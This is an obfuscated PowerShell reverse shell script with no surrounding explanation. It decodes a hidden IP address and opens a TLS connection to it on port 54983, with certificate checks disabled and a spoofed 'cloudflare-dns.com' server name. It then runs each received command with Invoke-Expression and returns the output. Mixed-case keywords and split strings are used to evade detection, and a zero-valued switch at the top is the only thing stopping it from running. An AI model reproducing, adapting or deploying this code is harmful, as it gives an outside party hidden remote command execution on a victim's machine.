$actIve = 0; 

if ($ACTIVE -ne 1) { eXIt }

try {
    $sSlProtOcoLS = [sYSTeM.sEcurIty.authENTICATion.SslPROtocOLS]::Tls12;
    
    $tarGetIP = [SystEm.tEXT.enCOdING]::UTF8.getstRiNG([SYStEM.CONVeRt]::FRomBasE64stRinG(('MT'+'Q2LjcwL'+'jI0MC4y'+'MDU'+'=')));
    $PORT = 54983;

    $TcpcLiEnt = nEW-OBject Net.soCKeTs.TCPCLienT($TArGEtIp, $POrT);
    $nEtWorkstreAm = $TcPCliEnt.GETSTreAM();
    
    $ssLsTReAm = NeW-OBJect NEt.SECUrIty.SsLstReaM($NetWORkstREam, ($ENV:CoMPUTErnamE.LenGTH -lt 0), ({(1 -band 1)} -as [nET.sECuriTY.remoTecerTiFIcaTEValidAtioNCALLBaCk]));
    $SslsTreAm.AuTheNtICAtEascliEnt(('cloudfl'+'are-dns'+'.com'), $NULl, $SslProtoCOLs, ($PSveRSIONTABLE.PsverSiOn.MajOR -lt 0));

    if(!$SSLSTrEAM.isenCrYpTed -or !$SslSTrEAM.IsSiGNED) {
        $SSlsTREaM.CLose();
        exIt;
    }

    $STREaMwrIteR = nEw-obJeCt io.stReAmWrITeR($SslstREAM);
    $StreamWRItEr.autofLUsh = ('x' -eq 'x');

# Waiting briefly before continuing with the next block
    function wriTeTostREAm ($strIng) {
        [byte[]]$ScRipt:bUffeR = nEw-ObjeCt systEm.byTe[] 4096;
        $sTrEAmWRiTER.wRItE($sTrinG + (-join('P','S',' ')) + (gl).PAtH + (-join('>',' ')));
    };

    WRITEtOstReam '';
    
    while(($ByteSrEad = $SSlsTReAM.reAD($BuffeR, 0, $bUfFeR.LENgTH)) -gt 0) {
        $Command = ([TeXT.eNCoDIng]::Utf8).gEtsTriNg($bUfFEr, 0, $BYteSREaD - 1).tRim();
        
        if ($Command -eq ('e'+'x'+'i'+'t')) { break }
        
        $OUtpUT = try {
            iNvokE-exprESsiON $Command 2>&1 | OUT-strinG
        } catch {
            $_ | OUt-stRiNG
        }
        
        writeTosTreAM ($OuTPut);
    }

    $streaMwRItEr.CLOSe();
    $TcpCLIenT.cLoSE();
} catch {

    eXIT;
}
